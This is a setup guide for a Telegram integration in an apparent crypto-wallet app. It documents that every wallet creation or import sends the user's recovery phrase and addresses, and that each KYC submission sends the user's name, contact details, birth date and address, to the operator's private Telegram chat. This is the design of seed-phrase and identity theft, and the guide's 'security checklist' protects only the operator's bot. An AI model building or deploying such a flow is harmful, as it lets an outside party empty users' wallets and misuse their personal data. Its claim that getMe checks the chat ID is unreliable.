# Telegram Integration - Quick Reference

## 🚀 Quick Start (5 Minutes)

### Step 1: Create Bot (2 min)
```
1. Open Telegram → Search "@BotFather"
2. Send: /newbot
3. Follow prompts, get your TOKEN
```

### Step 2: Get Chat ID (2 min)
```
1. Message your new bot
2. Visit: https://api.telegram.org/bot{TOKEN}/getUpdates
3. Copy your chat_id from the JSON response
```

### Step 3: Configure (1 min)
Create `.env.local` in project root:
```env
VITE_TELEGRAM_BOT_TOKEN=your_token_here
VITE_TELEGRAM_CHAT_ID=your_chat_id_here
```

Restart your dev server!

## 🧪 Test It

**Option A: Using Test Page**
```
Go to: http://localhost:5173/telegram-test
Click: "Test Connection" button
Check: Your Telegram chat for message
```

**Option B: Use Your App**
1. Create a new wallet on `/dashboard/wallets`
2. Check your Telegram chat for notification with seed phrase
3. Submit KYC to see personal data notification

## 📨 What Gets Sent

### Wallet Creation/Import
```
✓ Wallet name
✓ Recovery phrase (seed)
✓ XRP address
✓ EVM address
✓ Solana address
✓ TRON address
✓ Bitcoin address
✓ Timestamp
```

### KYC Submission
```
✓ First/last name
✓ Email
✓ Phone number
✓ Date of birth
✓ Full address
✓ Country
✓ Submission timestamp
```

## 🔒 Security Checklist

- [ ] `.env.local` is in `.gitignore`
- [ ] Bot token is kept secret
- [ ] Chat ID is kept secret
- [ ] Telegram bot is set to private
- [ ] Sensitive data (seeds) stored securely
- [ ] Consider enabling "Self-Destruct Timer" in Telegram

## 🆘 Troubleshooting

| Problem | Solution |
|---------|----------|
| "Telegram credentials not configured" | Check `.env.local` and restart server |
| Messages not appearing | Visit `getUpdates` URL to verify chat ID |
| Bot token invalid | Regenerate token from @BotFather |
| Rate limited | Wait a minute, then retry |

## 📝 Environment Variables

| Variable | Where to Get | Format |
|----------|-------------|--------|
| `VITE_TELEGRAM_BOT_TOKEN` | @BotFather /newbot | `123456:ABC-DEF...` |
| `VITE_TELEGRAM_CHAT_ID` | getUpdates API call | `987654321` |

## 📚 Reference

| Page | Purpose |
|------|---------|
| `/telegram-test` | Test your configuration |
| `src/services/telegramService.ts` | All Telegram functions |
| `TELEGRAM_SETUP.md` | Detailed setup guide |

## 🎯 Common Tasks

### Send test wallet notification
```typescript
// In TelegramTest.tsx - "Test Wallet Created" button
```

### Send test KYC notification
```typescript
// In TelegramTest.tsx - "Test KYC Submission" button
```

### Send custom message
```typescript
// In TelegramTest.tsx - enter text and send
```

### Disable notifications temporarily
```typescript
// Comment out sendWalletNotification() calls in Wallets.tsx
// Comment out sendKYCNotification() calls in KYCVerification.tsx
```

## 🔗 Useful Links

- [Telegram Bot API Docs](https://core.telegram.org/bots/api)
- [BotFather Command List](https://core.telegram.org/bots#botfather)
- [Supported HTML Tags](https://core.telegram.org/bots/api#html-style)

## 📞 Support

If messages don't arrive:
1. ✓ Check your Chat ID is correct: `https://api.telegram.org/bot{TOKEN}/getMe`
2. ✓ Message your bot at least once
3. ✓ Check Telegram Settings → Privacy → Blocked Users
4. ✓ Verify environment variables with `console.log`
5. ✓ Check browser console for errors
